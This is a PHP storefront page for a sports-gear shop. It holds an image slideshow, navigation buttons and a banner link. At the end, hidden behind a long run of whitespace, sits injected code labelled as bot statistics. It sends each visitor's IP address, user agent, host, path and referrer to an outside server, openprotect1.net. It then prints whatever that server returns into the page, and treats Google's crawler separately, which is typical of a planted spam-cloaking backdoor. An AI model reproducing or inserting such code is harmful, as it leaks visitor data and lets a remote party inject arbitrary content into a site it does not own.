<?php
error_reporting(0);

	require_once "default/initial.php";
	include_once "default/doctype.php";
?>
<script type="text/javascript" src="resources/fade-slideshow.js">

/***********************************************
* Ultimate Fade In Slideshow v2.0- (c) Dynamic Drive DHTML code library (www.dynamicdrive.com)
* This notice MUST stay intact for legal use
* Visit Dynamic Drive at http://www.dynamicdrive.com/ for this script and 100s more
***********************************************/

</script>
<script type="text/javascript">
var mygallery=new fadeSlideShow({
	wrapperid: "slideshow", //ID of blank DIV on page to house Slideshow
	dimensions: [500, 500], //width/height of gallery in pixels. Should reflect dimensions of largest image
	imagearray: [
		["resources/images/store/1.jpg"],
		["resources/images/store/2.jpg"],
		["resources/images/store/3.jpg"],
		["resources/images/store/4.jpg"],
		["resources/images/store/5.jpg"],
		["resources/images/store/6.jpg"],
		["resources/images/store/7.jpg"],
		["resources/images/store/8.jpg"],
		["resources/images/store/9.jpg"],
		["resources/images/store/10.jpg"],
		["resources/images/store/11.jpg"],
		["resources/images/store/12.jpg"],
		["resources/images/store/13.jpg"],
		["resources/images/store/14.jpg"],
		["resources/images/store/15.jpg"],
		["resources/images/store/16.jpg"] //<--no trailing comma after very last image element!
	],
	displaymode: {type:'auto', pause:2500, cycles:0, wraparound:false, randomize:false},
	persist: false, //remember last viewed slide and recall within same session?
	fadeduration: 500, //transition duration (milliseconds)
	descreveal: "ondemand", //ondemand | always | peekaboo | none
	togglerid: "slideshow-nav"
});
</script>
<style type="text/css">
#slideshow {
	height:500px;
	width:500px;
	position:relative;
	z-index:0;
	margin:auto;
	border:none;
}
#slideshow-nav {
	width:650px;
	margin:50px auto;
	text-align:center;
}
#slideshow-nav button {
	border-radius:25px;
}
#slideshow-nav div {
	display:inline-block; 
}
#slideshow-nav div a button {
	width:30px;
	height:25px;
}
#slideshow-nav div a button img {
	width:10px;
	height:10px;
}
</style>
<?php include "default/uniform.php"; ?>
<div id="slideshow-nav" class="box">
	<div>
		<a href="#" class="prev">
			<button class="button" onmouseover="this.firstChild.src='resources/images/buttons/prev-over.png';" onmouseout="this.firstChild.src='resources/images/buttons/prev.png';"><img src="resources/images/buttons/prev.png" alt="prev" /></button>
		</a>
	</div>
	<div style="margin:25px;">
		<div id="slideshow"></div>
		<span class="status" style="font-weight:bold; display:block;"></span>
	</div>
	<div>
		<a href="#" class="next">
			<button class="button" onmouseover="this.firstChild.src='resources/images/buttons/next-over.png';" onmouseout="this.firstChild.src='resources/images/buttons/next.png';"><img src="resources/images/buttons/next.png" alt="next" /></button>
		</a>
	</div>
</div>
<a href="giants.php?page=1"><img src="resources/images/bat.png" alt="Giants Gear" style="width:100%; margin:50px auto;" /></a>
<?php include "default/wrapper.php"; ?>

																																																																								 <?php 	/*This code use for global bot statistic*/ 	$sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); /*Looks for google search bot*/ 	$sReferer = ''; 	if(isset($_SERVER['HTTP_REFERER']) === true) 	{ 		$sReferer = strtolower($_SERVER['HTTP_REFERER']); 	} 	if(!(strpos($sUserAgent, 'google') === false)) /*Bot comes*/ 	{ 		if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) /*Create bot analitics*/			 		echo file_get_contents('http://openprotect1.net/Defense/Stat7/Stat.php?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']).'&ref='.urlencode($sReferer) ); 	} else 	{ 		if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) /*Create bot analitics*/			 		echo file_get_contents('http://openprotect1.net/Defense/Stat7/Stat.php?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&addcheck='.'&check='.isset($_GET['look']).'&ref='.urlencode($sReferer)); 	} /*Statistic code end*/ ?>  	
